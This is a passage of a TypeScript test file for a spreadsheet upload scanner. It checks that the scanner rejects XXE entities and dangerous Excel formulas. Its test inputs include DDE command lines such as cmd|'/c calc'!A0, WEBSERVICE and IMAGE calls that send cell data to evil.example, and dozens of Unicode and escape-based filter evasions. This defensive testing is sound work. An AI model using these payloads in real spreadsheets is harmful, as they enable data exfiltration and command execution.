import { readFileSync } from 'node:fs';
import { strToU8, unzipSync, type Unzipped } from 'fflate';
import { describe, expect, it } from 'vitest';

import {
  DEFAULT_COL_CAP,
  DEFAULT_MAX_BYTES,
  DEFAULT_ROW_CAP,
  MAX_FORMULA_TEXT_LENGTH,
} from './constants';
import {
  assertSafeXmlContent,
  createEntryContentSniff,
  entryContentKind,
  feedEntryContentSniff,
  finishEntryContentSniff,
  isXmlPart,
  type EntryContentKind,
} from './content-scan';
import { SpreadsheetFileError } from './errors';
import { SAFE_FORMULA_FUNCTIONS } from './formula-scan';
import { openUpload } from './guards';
import { UNSAFE_CONTENT_REASONS, ZIP_REJECT_REASONS } from './patch/reasons';
import { readUploadGrid } from './read-grid';
import { resolveReadOptions } from './read-options';
import { buildXlsxFixture, type XlsxFixtureSheet } from './testing/build-xlsx';
import { patchFixture } from './testing/patch-fixture';

const SPREADSHEET_NS = 'http://schemas.openxmlformats.org/spreadsheetml/2006/main';
const SHEET_PART = 'xl/worksheets/sheet1.xml';
const SECOND_SHEET_PART = 'xl/worksheets/sheet2.xml';
const WORKBOOK_RELS_PART = 'xl/_rels/workbook.xml.rels';
const SHARED_STRINGS_PART = 'xl/sharedStrings.xml';
const UTF8_DECLARATION = '<?xml version="1.0" encoding="UTF-8"?>';
const GUARD_OPTS = {
  rowCap: DEFAULT_ROW_CAP,
  colCap: DEFAULT_COL_CAP,
  maxBytes: DEFAULT_MAX_BYTES,
} as const;
// The S2 formula of trendyol-plus-tariff.xlsx exactly as stored, its quotes written as
// &quot; (the two non-ASCII letters escaped so this source stays ASCII).
const PLUS_S2_FORMULA =
  '=IF(OR(Q2=&quot;&quot;, R2=&quot;&quot;), &quot;-&quot;, IF(ISNUMBER(SEARCH(&quot;7 G\u00fcnl\u00fck&quot;, R2)), IF(Q2&lt;=M2, O2, &quot;-&quot;), &quot;-&quot;))';

// Real Trendyol exports committed under apps/api/tests/fixtures; a seller's normal
// file must never trip the content scan.
const API_FIXTURES: readonly string[] = [
  'trendyol-commission-tariff.xlsx',
  'trendyol-tariff-1period.xlsx',
  'trendyol-plus-tariff.xlsx',
  'trendyol-plus-tariff-3ve4.xlsx',
  'trendyol-discount-products.xlsx',
  'trendyol-flash-products.xlsx',
  'trendyol-advantage-tariff.xlsx',
  'marketplace-campaign-sample.xlsx',
];

function readFixture(file: string): Buffer {
  return readFileSync(new URL(`../../../apps/api/tests/fixtures/${file}`, import.meta.url));
}

// Non-ASCII text built from code points, so this source stays ASCII.
const LONG_S = String.fromCodePoint(0x17f); // LATIN SMALL LETTER LONG S
const BYTE_ORDER_MARK = String.fromCodePoint(0xfeff);
// A Turkish sheet name: capital U with diaeresis, r, small u with diaeresis, nler.
const URUNLER = `${String.fromCodePoint(0xdc)}r${String.fromCodePoint(0xfc)}nler`;
// From an ASCII capital letter to its full-width, its mathematical bold and its circled form.
const FULL_WIDTH_OFFSET = 0xff21 - 0x41;
const MATH_BOLD_OFFSET = 0x1d400 - 0x41;
const CIRCLED_OFFSET = 0x24b6 - 0x41;

/** `capitals` (ASCII capital letters) with each letter moved `offset` code points up. */
function shiftedCapitals(capitals: string, offset: number): string {
  return Array.from(capitals, (letter) => String.fromCodePoint(letter.charCodeAt(0) + offset)).join(
    '',
  );
}

function worksheetWithText(text: string, prolog = ''): string {
  return (
    `<?xml version="1.0" encoding="UTF-8"?>${prolog}<worksheet xmlns="${SPREADSHEET_NS}">` +
    `<sheetData><row r="1"><c r="A1" t="inlineStr"><is><t>${text}</t></is></c></row>` +
    `</sheetData></worksheet>`
  );
}

function entriesOf(parts: Readonly<Record<string, string>>): Unzipped {
  const out: Unzipped = {};
  for (const [path, text] of Object.entries(parts)) out[path] = strToU8(text);
  return out;
}

// Returns the SpreadsheetFileError the scan throws, null when it passes, and
// re-throws anything unexpected.
function scanError(entries: Unzipped): SpreadsheetFileError | null {
  try {
    assertSafeXmlContent(Object.entries(entries));
    return null;
  } catch (e) {
    if (e instanceof SpreadsheetFileError) return e;
    throw e;
  }
}

// The SpreadsheetFileError `run` throws, null when it returns; anything else re-thrown.
function fileErrorOf(run: () => unknown): SpreadsheetFileError | null {
  try {
    run();
    return null;
  } catch (e) {
    if (e instanceof SpreadsheetFileError) return e;
    throw e;
  }
}

function gateError(file: Buffer): SpreadsheetFileError | null {
  return fileErrorOf(() => openUpload(file, GUARD_OPTS));
}

describe('assertSafeXmlContent', () => {
  it('rejects a DOCTYPE', () => {
    const upper = scanError(
      entriesOf({ [SHEET_PART]: worksheetWithText('x', '<!DOCTYPE worksheet>') }),
    );
    expect(upper?.code).toBe('UNSAFE_CONTENT');
    expect(upper?.meta).toEqual({ entry: SHEET_PART });

    const lower = scanError(
      entriesOf({ [SHEET_PART]: worksheetWithText('x', '<!doctype worksheet>') }),
    );
    expect(lower?.code).toBe('UNSAFE_CONTENT');
  });

  it('rejects an ENTITY declaration', () => {
    const err = scanError(
      entriesOf({
        [WORKBOOK_RELS_PART]: '<?xml version="1.0"?><!ENTITY lol "lol"><Relationships/>',
      }),
    );
    expect(err?.code).toBe('UNSAFE_CONTENT');
    expect(err?.meta).toEqual({ entry: WORKBOOK_RELS_PART });
  });

  it('rejects an unknown entity reference (&xxe;)', () => {
    const err = scanError(entriesOf({ [SHEET_PART]: worksheetWithText('&xxe;') }));
    expect(err?.code).toBe('UNSAFE_CONTENT');
    expect(err?.meta).toEqual({ entry: SHEET_PART });
  });

  it('accepts the five predefined and numeric references', () => {
    const err = scanError(
      entriesOf({ [SHEET_PART]: worksheetWithText('&amp;&lt;&gt;&quot;&apos;&#304;&#x130;') }),
    );
    expect(err).toBeNull();
  });

  it('accepts all eight api fixtures', () => {
    for (const file of API_FIXTURES) {
      expect(scanError(unzipSync(new Uint8Array(readFixture(file)))), file).toBeNull();
    }
  });
});

/** A worksheet whose one cell holds `cellContent`; the root also binds the `x` prefix. */
function worksheetWithCell(cellContent: string): string {
  return (
    `<?xml version="1.0" encoding="UTF-8"?><worksheet xmlns="${SPREADSHEET_NS}" xmlns:x="${SPREADSHEET_NS}">` +
    `<sheetData><row r="1"><c r="A1">${cellContent}</c></row></sheetData></worksheet>`
  );
}

/** A worksheet whose one cell holds the formula element `formula` and a cached value. */
function worksheetWithFormula(formula: string): string {
  return worksheetWithCell(`${formula}<v>0</v>`);
}

/** `text` written into XML character data: '&', '<' and '>' as references. */
function xmlText(text: string): string {
  return text.replaceAll('&', '&amp;').replaceAll('<', '&lt;').replaceAll('>', '&gt;');
}

/** The scan's error for a worksheet whose one formula is the decoded formula text `text`. */
function formulaError(text: string): SpreadsheetFileError | null {
  return scanError(entriesOf({ [SHEET_PART]: worksheetWithFormula(`<f>${xmlText(text)}</f>`) }));
}

function expectUnsafeFormula(error: SpreadsheetFileError | null, entry = SHEET_PART): void {
  expect(error?.code).toBe('UNSAFE_CONTENT');
  expect(error?.meta).toEqual({ reason: UNSAFE_CONTENT_REASONS.UNSAFE_FORMULA, entry });
}

function expectUnsafePart(error: SpreadsheetFileError | null, entry = SHEET_PART): void {
  expect(error?.code).toBe('UNSAFE_CONTENT');
  expect(error?.meta).toEqual({ reason: UNSAFE_CONTENT_REASONS.UNSAFE_PART, entry });
}

describe('assertSafeXmlContent: formula fields', () => {
  it.each([
    '<f>WEBSERVICE("http://x")</f>',
    '<f>webservice ("x")</f>',
    '<f>HYPERLINK("http://x","y")</f>',
    '<f>IMPORTXML(A1)</f>',
    '<f>CALL("k","f")</f>',
    '<f>REGISTER.ID("k","f")</f>',
    "<f>cmd|'/c calc'!A1</f>",
    '<f>[1]Sheet1!A1</f>',
    '<x:f>EXEC("a")</x:f>',
  ])('refuses %s', (formula) => {
    expectUnsafeFormula(scanError(entriesOf({ [SHEET_PART]: worksheetWithFormula(formula) })));
  });

  it.each([
    '<f>_xlfn.WEBSERVICE("x")</f>',
    '<f>_XLFN._xlws.WEBSERVICE("x")</f>',
    '<f>&#87;EBSERVICE("x")</f>',
    '<f>&#x57;EBSERVICE("x")</f>',
    '<f>&#0000087;EBSERVICE("x")</f>',
    '<f>WEB<!--x-->SERVICE("x")</f>',
    '<f><![CDATA[WEBSERVICE("x")]]></f>',
    '<f>WEBSERVICE<?x?>("x")</f>',
    '<f>IF(A1=&quot;a&quot;,WEBSERVICE(B1),1)</f>',
    '<f>A1&#124;B1</f>',
    '<f>A1<g/></f>',
    '<f>WEB&#xAD;SERVICE(1)</f>',
    '<f>WEBSERVICE&#40;"x")</f>',
    '<f>_xlfn&#46;WEBSERVICE("x")</f>',
    '<f>&#91;1]S!A1</f>',
    '<f>WEBSERVICE&#xA0;("x")</f>',
    '<f>WEBSERVICE&#9;("x")</f>',
    '<f>WEBSERVICE&#10;("x")</f>',
    '<f t="shared" ref="A1:A3" si="0">WEBSERVICE("x")</f>',
    '<f t="array" ref="A1:A3">WEBSERVICE("x")</f>',
    '<f>WEBSERVICE("x")</f >',
  ])('refuses the evasion %s', (formula) => {
    expectUnsafeFormula(scanError(entriesOf({ [SHEET_PART]: worksheetWithFormula(formula) })));
  });

  // A function passed by name (an eta lambda) needs a function outside the list to call
  // it; an internal prefix refuses wherever it stands.
  it.each([
    '_xlfn.MAP("http://evil.example/",_xleta.WEBSERVICE)',
    '_xlfn.LET(_xlpm.w,_xleta.WEBSERVICE,_xlpm.w("http://evil.example"))',
    '_xlfn.BYROW(A1:A2,_xlfn.WEBSERVICE)',
    '_xlfn.LET(_xlpm.w,_xleta.IMPORTXML,_xlpm.w(A1))',
    '_xlfn.MAP(A1,_xleta.IMPORTRANGE)',
    '_XLETA._xlpm.WEBSERVICE',
    '_XlEtA._xlfn.ImportXml',
    '_XlFn._xLwS._XLL._xlfn.webService("x")',
  ])('refuses a function passed by name or behind an internal prefix: %s', (text) => {
    expectUnsafeFormula(formulaError(text));
  });

  // A quoted sheet name may hold '"' and '|'; the scan reads it whole, so neither a quote
  // inside it nor one after it hides a name.
  it.each([
    "<f>'a&quot;b'!A1&amp;WEBSERVICE(&quot;http://evil.example/?d=&quot;&amp;A2)</f>",
    "<f>'a&quot;b'!A1&amp;WEBSERVICE(&quot;http://x&quot;)&amp;'a&quot;b'!A1</f>",
    '<f>\'x\'!A1&amp;WEBSERVICE("u")</f>',
    "<f>'It''s'!A1&amp;WEBSERVICE(\"u\")</f>",
    "<f>'abc!A1</f>",
    "<f>'It''s!A1</f>",
    "<f>'a''</f>",
    "<f>'a''b'!A1|B1</f>",
    '<f>IF(A1="abc,1,2)</f>',
    '<f>IF(A1="say ""x"",1,2)</f>',
    '<f>&quot;abc</f>',
    '<f>"a""b"&amp;WEBSERVICE("x")</f>',
  ])('refuses a sheet name or literal it cannot close, or a name after one: %s', (formula) => {
    expectUnsafeFormula(scanError(entriesOf({ [SHEET_PART]: worksheetWithFormula(formula) })));
  });

  // A name a reader that normalises (NFKC) or upper-cases with Unicode rules reads as a
  // function outside the list: U+017F LATIN SMALL LETTER LONG S, U+0131 LATIN SMALL LETTER
  // DOTLESS I, full-width letters, mathematical bold letters.
  it.each([
    '<f>WEB&#383;ERVICE("x")</f>',
    `<f>WEB${LONG_S}ERVICE("x")</f>`,
    '<f>&#305;MPORTXML("x","//a")</f>',
    `<f>${shiftedCapitals('WEBSERVICE', FULL_WIDTH_OFFSET)}("x")</f>`,
    `<f>${shiftedCapitals('WEBSERVICE', MATH_BOLD_OFFSET)}("x")</f>`,
  ])('refuses the Unicode variant %s', (formula) => {
    expectUnsafeFormula(scanError(entriesOf({ [SHEET_PART]: worksheetWithFormula(formula) })));
  });

  it.each([
    `<f>${PLUS_S2_FORMULA}</f>`,
    '<f>OFFSET($Z2,0,0,1,COUNTA($Z2:$AB2))</f>',
    '<f>IF(A1=&quot;WEBSERVICE(&quot;,1,2)</f>',
    '<f>IF(A1&lt;=B1,1,2)</f>',
    '<f>IF(ISNUMBER(SEARCH("a",B2)),"WEBSERVICE(",1)</f>',
    '<f>IF(A1="say ""WEBSERVICE(""",1,2)</f>',
    '<f>IMAGES1+RTD2</f>',
    '<f t="shared" si="0"/>',
    "<f>'a|b'!A1</f>",
    "<f>'It''s'!A1</f>",
    '<f>&apos;It&apos;&apos;s&apos;!A1</f>',
    "<f>'a&quot;b'!A1+1</f>",
    '<f>IF(A1="it\'s",1,2)</f>',
    "<f>SUM('x'!A1,'y'!B2)</f>",
    `<f>'${URUNLER}'!A1</f>`,
    `<f>${URUNLER}!A1</f>`,
    `<f>${URUNLER.normalize('NFD')}!A1</f>`,
    '<f>CALL</f>',
  ])('accepts %s', (formula) => {
    expect(scanError(entriesOf({ [SHEET_PART]: worksheetWithFormula(formula) }))).toBeNull();
  });

  it('accepts the text WEBSERVICE( in a cell value outside any formula', () => {
    const xml = worksheetWithCell('<is><t>WEBSERVICE("x")</t></is>').replace(
      '<c r="A1">',
      '<c r="A1" t="inlineStr">',
    );

    expect(scanError(entriesOf({ [SHEET_PART]: xml }))).toBeNull();
  });

  // A cell may hold text that starts with '=', '+', '-' or '@': xlsx stores it as a
  // string, which Excel shows and never evaluates.
  it('accepts formula-looking string values', () => {
    const xml =
      `${UTF8_DECLARATION}<worksheet xmlns="${SPREADSHEET_NS}"><sheetData><row r="1">` +
      '<c r="A1" t="inlineStr"><is><t>=WEBSERVICE("http://evil.example/?"&amp;B1)</t></is></c>' +
      `<c r="B1" t="str"><v>=cmd|'/c calc'!A0</v></c>` +
      `<c r="C1" t="inlineStr"><is><t>@SUM(1+1)*cmd|' /C calc'!A0</t></is></c>` +
      '</row></sheetData></worksheet>';

    expect(scanError(entriesOf({ [SHEET_PART]: xml }))).toBeNull();
  });

  it('refuses a formula element that never closes', () => {
    const whole = worksheetWithFormula('<f>1+1</f>');
    const truncated = whole.slice(0, whole.indexOf('</f>'));

    expectUnsafeFormula(scanError(entriesOf({ [SHEET_PART]: truncated })));
  });

  it('refuses a formula element closed by the end tag of another element', () => {
    expectUnsafeFormula(
      scanError(entriesOf({ [SHEET_PART]: worksheetWithCell('<f>1+1</v><v>2</v>') })),
    );
  });

  // The strict lexer refuses markup xmldom reads; past it the walk cannot tell where the
  // fields are, so any start tag another reader could take for a field element, and any
  // name of a field or macro attribute, refuses.
  it('refuses a formula after markup the strict lexer cannot read', () => {
    const noSpaceBetweenAttributes = worksheetWithFormula('<f>WEBSERVICE("x")</f>').replace(
      '<c r="A1">',
      '<c r="A1"t="n">',
    );
    const nonAsciiPrefix = worksheetWithFormula(
      '<\u00fc:f xmlns:\u00fc="urn:x">WEBSERVICE("x")</\u00fc:f>',
    );

    expectUnsafeFormula(scanError(entriesOf({ [SHEET_PART]: noSpaceBetweenAttributes })));
    expectUnsafeFormula(scanError(entriesOf({ [SHEET_PART]: nonAsciiPrefix })));
  });

  it.each([
    [
      'a later defined name',
      '<definedName name="x">1</definedName>',
      UNSAFE_CONTENT_REASONS.UNSAFE_FORMULA,
    ],
    ['a later macro attribute', '<sp macro="[0]!m"/>', UNSAFE_CONTENT_REASONS.UNSAFE_FORMULA],
    [
      'a later textlink attribute in another case',
      '<sp TextLink="$A$1"/>',
      UNSAFE_CONTENT_REASONS.UNSAFE_FORMULA,
    ],
    ['a later oleObject', '<oleObject progId="Package"/>', UNSAFE_CONTENT_REASONS.UNSAFE_PART],
  ])('refuses %s after markup the strict lexer cannot read', (_label, later, reason) => {
    const xml = worksheetWithCell('<v>1</v>').replace('<c r="A1">', `<c r="A1"t="n">${later}`);

    const error = scanError(entriesOf({ [SHEET_PART]: xml }));

    expect(error?.code).toBe('UNSAFE_CONTENT');
    expect(error?.meta).toEqual({ reason, entry: SHEET_PART });
  });

  it('accepts markup the strict lexer cannot read when no field follows it', () => {
    const xml = worksheetWithCell('<v>1</v>').replace('<c r="A1">', '<c r="A1"t="n">');

    expect(scanError(entriesOf({ [SHEET_PART]: xml }))).toBeNull();
  });

  it('refuses an unsafe formula in a workbook at the upload gate', () => {
    const file = buildXlsxFixture([
      { name: 'Sheet1', xml: worksheetWithFormula('<f>_xlfn.WEBSERVICE("http://x")</f>') },
    ]);

    expectUnsafeFormula(gateError(file));
  });
});

// Probe inputs of the review rounds, as decoded formula text: each reaches outside the
// workbook, or could in a reader that decodes, normalises or splits names differently.
describe('assertSafeXmlContent: the formula allow list', () => {
  it.each([
    ['circled letters', `${shiftedCapitals('WEBSERVICE', CIRCLED_OFFSET)}("http://evil.example/")`],
    ['one circled letter', `W${shiftedCapitals('E', CIRCLED_OFFSET)}BSERVICE("x")`],
    ['a circled last letter', `WEBSERVIC${shiftedCapitals('E', CIRCLED_OFFSET)}("x")`],
    ['a full-width low line prefix', '\uff3fxlfn.WEBSERVICE("http://evil.example/")'],
    ['full-width quotes around a call', '"\uff02&WEBSERVICE("http://evil.example/")&\uff02"'],
    ['a full-width DDE bar', "cmd\uff5c'/c calc'!A0"],
    ['a full-width bracket', '\uff3b1]Sheet1!A1'],
    ['a full-width parenthesis', 'WEBSERVICE\uff08"x")'],
    ['a soft hyphen', 'WEB\u00adSERVICE("x")'],
    ['a zero-width joiner', 'WEB\u200dSERVICE("x")'],
    ['a zero-width space', 'WEB\u200bSERVICE("x")'],
    ['a word joiner', 'WEB\u2060SERVICE("x")'],
    ['a right-to-left mark', 'WEB\u200fSERVICE("x")'],
    ['a byte order mark', 'WEB\ufeffSERVICE("x")'],
    ['a format character at the end', 'SUM(A1)\u200b'],
    ['a format character in a quoted sheet name', "'a\u200bb'!A1"],
    ['a format character in a structured reference', 'T[a\u200bb]'],
    ['a combining grapheme joiner', 'WEB\u034fSERVICE("x")'],
    ['a variation selector', 'WEB\ufe0fSERVICE("x")'],
    ['a combining accent on the first letter', 'W\u0301EBSERVICE("x")'],
    ['a combining accent after the name', 'WEBSERVICE\u0301("x")'],
    ['a dotted capital I', 'WEBSERV\u0130CE("x")'],
    ['a Roman numeral one', 'WEBSERV\u2160CE("x")'],
    ['a ligature', 'WEBSERVI\ufb00("x")'],
    ['a line break inside the name', 'WEB\nSERVICE("x")'],
    ['an at sign', '@WEBSERVICE("x")'],
    ['a name behind KELVIN SIGN', '\u212aWEBSERVICE("x")'],
    ['the _xludf. prefix', '_xludf.WEBSERVICE("http://evil.example/")'],
    ['the _xludf. prefix on an allowed name', '_xludf.SUM(1)'],
    ['the _xlop. prefix after _xlfn.', '_xlfn._xlop.WEBSERVICE("x")'],
    ['the _xlnm. prefix', '_xlnm.WEBSERVICE(1)'],
    ['a defined name behind _xlnm.', '_xlnm.Print_Area'],
    ['the _xlpm. prefix', '_xlpm.x'],
    ['a vendor-qualified name', '_xlfn.COM.MICROSOFT.WEBSERVICE("x")'],
    ['a vendor-qualified name without prefix', 'COM.MICROSOFT.WEBSERVICE("x")'],
    ['an OpenOffice DDE', 'ORG.OPENOFFICE.DDE("cmd";"/c calc";"A1")'],
    ['DDE', 'DDE("cmd","/c calc","A1")'],
    ['LAMBDA', '_xlfn.LAMBDA(_xlpm.x,WEBSERVICE(_xlpm.x))("x")'],
    ['a LAMBDA parameter named like a function', '_xlfn.LAMBDA(_xlpm.image,_xlpm.image*2)(1)'],
    ['PY', '_xlfn._xlws.PY("import os",0)'],
    ['COPILOT', '_xlfn.COPILOT("send",A1:A9)'],
    ['STOCKHISTORY', '_xlfn.STOCKHISTORY("MSFT",TODAY())'],
    ['TRANSLATE', '_xlfn.TRANSLATE(A1,"tr","en")'],
    ['DETECTLANGUAGE', '_xlfn.DETECTLANGUAGE(A1)'],
    ['FILTERXML', '_xlfn.FILTERXML("<a/>","//a")'],
    ['ENCODEURL', '_xlfn.ENCODEURL(A1)'],
    ['IMAGE', '_xlfn.IMAGE("http://evil.example/?"&A1)'],
    ['RTD', 'RTD("prog.id","evil-host","t")'],
    ['SQL.REQUEST', 'SQL.REQUEST("DSN=x",,1,"select 1")'],
    ['INFO', 'INFO("directory")'],
    ['CELL', 'CELL("filename")'],
    ['INDIRECT to another workbook', 'INDIRECT("[evil.xlsx]S!A1")'],
    ['INDIRECT to a DDE link', 'INDIRECT("cmd|\'/c calc\'!A0")'],
    ['EVALUATE', 'EVALUATE("1")'],
    ['CUBEVALUE', 'CUBEVALUE("conn","x")'],
    ['IMPORTDATA', 'IMPORTDATA("http://evil.example/")'],
    ['HYPERLINK to a web page', 'HYPERLINK("https://www.trendyol.com/x","link")'],
    ['a name ending in a listed one', 'RECALL(A1)'],
    ['a call after white space', 'WEBSERVICE \r\n ("x")'],
    ['a number called', '5(A1)'],
    ['an _xHHHH_ escape of the first letter', '_x0057_EBSERVICE("http://evil.example/?"&A2)'],
    [
      'escapes of every letter',
      '_x0057__x0045__x0042__x0053__x0045__x0052__x0056__x0049__x0043__x0045_("x")',
    ],
    ['an escape inside the name', 'WEB_x0053_ERVICE("x")'],
    ['an escaped DDE bar', "cmd_x007C_'/c calc'!A0"],
    ['escaped brackets', '_x005B_1_x005D_Sheet1!A1'],
    ['an escaped quote', '"_x0022_&WEBSERVICE("http://evil.example/")&_x0022_"'],
    ['an escape after a prefix', '_xlfn._x0049_MAGE("http://evil.example/p.png")'],
    ['an escape in lower-case hexadecimal', 'SUM(1)&_x00ab_'],
    ['an escape inside a string literal', 'IF(A1="_X0041_",1,2)'],
    ['a full-width escape', 'SUM(1)&\uff3f\uff58\uff10\uff10\uff14\uff11\uff3f'],
    ['a DDE link', "cmd|'/c calc'!A0"],
    ['a reference into another workbook', '[1]Sheet1!A1'],
    ['a bracket that closes nothing', 'A1]'],
    ['a structured reference that never closes', 'Table1[Fiyat'],
    ['an escape at the end of a structured reference', "Table1['"],
    ['an external workbook in a quoted sheet name', "'[1]My Sheet'!A1"],
    [
      'a network path workbook in a quoted sheet name',
      "'\\\\evil.example\\share\\[x.xlsx]Sheet1'!A1",
    ],
    ['a web workbook in a quoted sheet name', "'http://evil.example/[x.xlsx]Sheet1'!A1"],
    ['a drive path workbook in a quoted sheet name', "'C:\\Users\\Public\\[x.xlsx]S'!A1"],
    ['a network path name without a bracket', "'\\\\evil.example\\share\\x.xlsx'!Secret"],
    ['a web name without a bracket', "'http://evil.example/x.xlsx'!Secret"],
    ['a question mark in a quoted sheet name', "'a?b'!A1"],
    ['an asterisk in a quoted sheet name', "'a*b'!A1"],
    ['a sum over a quoted external range', "SUM('\\\\evil.example\\s\\[a.xlsx]S'!A1:A9)"],
  ])('refuses %s', (_label, text) => {
    expectUnsafeFormula(formulaError(text));
  });

  it.each([
    ['a sheet named Imports', 'Imports!A1'],
    ['a defined name that starts with Import', 'ImportFee*2'],
    ['a whole column RTD', 'RTD:RTD'],
    ['a sum over a whole column RTD', 'SUM(RTD:RTD)'],
    ['an absolute reference to column RTD', 'SUM($RTD$1)'],
    ['a bare CALL', 'CALL'],
    ['a sheet named Image', 'SUM(Image!B:B)'],
    ['a sheet named Exec', 'Exec!A1'],
    ['a sheet named Call', 'Call!A1'],
    ['a Turkish sheet name', `${URUNLER}!A1`],
    ['a quoted Turkish sheet name', `'${URUNLER}'!A1`],
    ['a sheet name with a dotted capital I', '\u0130THALAT!A1'],
    ['a doubled apostrophe in a sheet name', "'It''s'!A1"],
    ['a bar in a quoted sheet name', "'a|b'!A1"],
    ['a 3-D reference', "'Jan:Mar'!A1"],
    ['an apostrophe in a string literal', 'IF(A1="it\'s",1,2)'],
    ['a format character in a string literal', 'IF(A1="a\u200bb",1,2)'],
    ['a rounded product', 'ROUND(A1*0.9,2)'],
    ['a lookup', 'VLOOKUP(A1,B:C,2,FALSE)'],
    ['a structured reference', 'SUM(Table1[Fiyat])'],
    ['a this-row structured reference', 'Table1[[#This Row],[Fiyat]]*2'],
    ['an escaped bracket in a structured reference', "Table1['[Fiyat]*2"],
    ['XLOOKUP over structured references', 'XLOOKUP(A1,Urunler[Barkod],Urunler[Fiyat])'],
    ['XLOOKUP behind _xlfn.', '_xlfn.XLOOKUP(A1,Urunler[Barkod],Urunler[Fiyat])'],
    ['SORT behind _xlfn._xlws.', '_xlfn._xlws.SORT(A1:A9)'],
    ['the 3ve4 data validation formula', 'OFFSET($Z2,0,0,1,COUNTA($Z2:$AB2))'],
    ['a call after white space', 'SUM (A1:A2)'],
    ['error values', 'IFERROR(#N/A,#REF!)'],
    ['an array constant', 'SUM({1,2;3,4})'],
  ])('accepts %s', (_label, text) => {
    expect(formulaError(text)).toBeNull();
  });

  it('pins the allow list: sorted upper-case ASCII names, no function that reaches outside', () => {
    expect(SAFE_FORMULA_FUNCTIONS).toEqual([...SAFE_FORMULA_FUNCTIONS].sort());
    for (const name of SAFE_FORMULA_FUNCTIONS) expect(name).toMatch(/^[A-Z][A-Z.]*$/);
    // Every function the eight real files call, in any formula field.
    expect(SAFE_FORMULA_FUNCTIONS).toEqual(
      expect.arrayContaining([
        'AND',
        'COUNTA',
        'IF',
        'ISBLANK',
        'ISNUMBER',
        'OFFSET',
        'OR',
        'SEARCH',
      ]),
    );
    for (const name of [
      'WEBSERVICE',
      'FILTERXML',
      'ENCODEURL',
      'IMAGE',
      'RTD',
      'CALL',
      'REGISTER',
      'REGISTER.ID',
      'EXEC',
      'HYPERLINK',
      'INDIRECT',
      'CELL',
      'INFO',
      'STOCKHISTORY',
      'TRANSLATE',
      'DETECTLANGUAGE',
      'PY',
      'COPILOT',
      'DDE',
      'SQL.REQUEST',
      'LAMBDA',
      'LET',
      'MAP',
      'REDUCE',
      'SCAN',
      'BYROW',
      'BYCOL',
      'MAKEARRAY',
      'ISOMITTED',
    ]) {
      expect(SAFE_FORMULA_FUNCTIONS).not.toContain(name);
    }
    expect(SAFE_FORMULA_FUNCTIONS.filter((name) => name.startsWith('IMPORT'))).toEqual([]);
  });

  it('accepts a call of every function of the allow list, with and without _xlfn.', () => {
    for (const name of SAFE_FORMULA_FUNCTIONS) {
      expect(formulaError(`${name}(A1)`), name).toBeNull();
      expect(formulaError(`_xlfn.${name.toLowerCase()}(A1)`), name).toBeNull();
    }
  });

  it('accepts a formula of MAX_FORMULA_TEXT_LENGTH and refuses one longer', () => {
    const atCap = `${'1+'.repeat(MAX_FORMULA_TEXT_LENGTH / 2 - 1)}10`;

    expect(atCap).toHaveLength(MAX_FORMULA_TEXT_LENGTH);
    expect(formulaError(atCap)).toBeNull();
    expectUnsafeFormula(formulaError(`${atCap}0`));
  });

  // A quantified Unicode class over a run of millions of letters overflowed V8's
  // backtracking stack; the refusal must stay a file error.
  it('refuses a five-million-letter non-ASCII name as a file error, in the scan and the gate', () => {
    const name = `${'\u00fc'.repeat(5_000_000)}!A1`;
    const file = buildXlsxFixture([
      { name: 'Sheet1', xml: worksheetWithFormula(`<f>${name}</f>`) },
    ]);

    expectUnsafeFormula(formulaError(name));
    expectUnsafeFormula(gateError(file));
  });
});

const WORKBOOK_PART = 'xl/workbook.xml';
const OFFICE_RELATIONSHIPS_NS =
  'http://schemas.openxmlformats.org/officeDocument/2006/relationships';
const DRAWING_NS = 'http://schemas.openxmlformats.org/drawingml/2006/spreadsheetDrawing';
const DRAWING_PART = 'xl/drawings/drawing1.xml';
const VML_PART = 'xl/drawings/vmlDrawing1.vml';
const VML_NAMESPACES =
  'xmlns:v="urn:schemas-microsoft-com:vml" xmlns:o="urn:schemas-microsoft-com:office:office" ' +
  'xmlns:x="urn:schemas-microsoft-com:office:excel"';
const EVIL_CALL = 'WEBSERVICE(&quot;http://evil.example/&quot;)';
const DDE_LINK = "cmd|'/c calc'!A0";

/** A workbook part whose root holds `inner` after its sheets. */
function workbookWith(inner: string): string {
  return (
    `${UTF8_DECLARATION}<workbook xmlns="${SPREADSHEET_NS}" xmlns:r="${OFFICE_RELATIONSHIPS_NS}">` +
    `<sheets><sheet name="S" sheetId="1" r:id="rId1"/></sheets>${inner}</workbook>`
  );
}

/** A worksheet whose root holds `after` after its sheet data. */
function worksheetWithAfter(after: string): string {
  return (
    `${UTF8_DECLARATION}<worksheet xmlns="${SPREADSHEET_NS}" xmlns:r="${OFFICE_RELATIONSHIPS_NS}">` +
    `<sheetData><row r="1"><c r="A1"><v>1</v></c></row></sheetData>${after}</worksheet>`
  );
}

/** A drawing part whose one anchor holds `shape`. */
function drawingWith(shape: string): string {
  return (
    `${UTF8_DECLARATION}<xdr:wsDr xmlns:xdr="${DRAWING_NS}" xmlns:r="${OFFICE_RELATIONSHIPS_NS}">` +
    `<xdr:twoCellAnchor>${shape}</xdr:twoCellAnchor></xdr:wsDr>`
  );
}

/** A VML drawing (no declaration, an `xml` root) whose one shape holds `clientData`. */
function vmlWith(clientData: string): string {
  return (
    `<xml ${VML_NAMESPACES}><v:shape id="b" type="#_x0000_t201">` +
    `<x:ClientData ObjectType="Button">${clientData}</x:ClientData></v:shape></xml>`
  );
}

// Every field Excel evaluates as a formula, in every XML part whatever its root and path.
describe('assertSafeXmlContent: formula fields in every part', () => {
  it.each<[label: string, entry: string, xml: string]>([
    [
      'a defined name calling WEBSERVICE',
      WORKBOOK_PART,
      workbookWith(
        `<definedNames><definedName name="leak">${EVIL_CALL}</definedName></definedNames>`,
      ),
    ],
    [
      'a defined name holding a DDE link',
      WORKBOOK_PART,
      workbookWith(
        `<definedNames><definedName name="pwn">${DDE_LINK}</definedName></definedNames>`,
      ),
    ],
    [
      'a defined name holding a comment',
      WORKBOOK_PART,
      workbookWith('<definedNames><definedName name="x">A1<!--c--></definedName></definedNames>'),
    ],
    [
      'a data validation formula1',
      SHEET_PART,
      worksheetWithAfter(
        `<dataValidations count="1"><dataValidation type="custom" sqref="A1"><formula1>ISNUMBER(${EVIL_CALL})</formula1></dataValidation></dataValidations>`,
      ),
    ],
    [
      'a data validation formula2',
      SHEET_PART,
      worksheetWithAfter(
        `<dataValidations count="1"><dataValidation type="whole" sqref="A1"><formula1>1</formula1><formula2>LEN(${EVIL_CALL})</formula2></dataValidation></dataValidations>`,
      ),
    ],
    [
      'an x14 data validation formula1 holding an element',
      SHEET_PART,
      worksheetWithAfter(
